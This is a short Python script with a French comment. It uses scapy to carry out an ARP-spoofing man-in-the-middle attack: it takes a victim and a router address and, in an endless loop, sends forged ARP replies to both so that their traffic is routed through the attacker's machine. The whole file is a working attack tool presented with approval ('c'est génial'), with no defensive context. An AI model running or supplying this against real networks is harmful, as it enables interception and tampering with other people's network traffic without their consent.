# utilisation comme le spoofing mais avec .py <victime> <routeur> (c'est génial)
from scapy.all import *
import sys

victime  = sys.argv[1]
routeur  = sys.argv[2]

while True:

    # victime
    send(ARP(op=2, pdst=victime,  psrc=routeur),  verbose=0)

    # routeur
    send(ARP(op=2, pdst=routeur,  psrc=victime),  verbose=0)

    print("mitm en place...")
    time.sleep(1)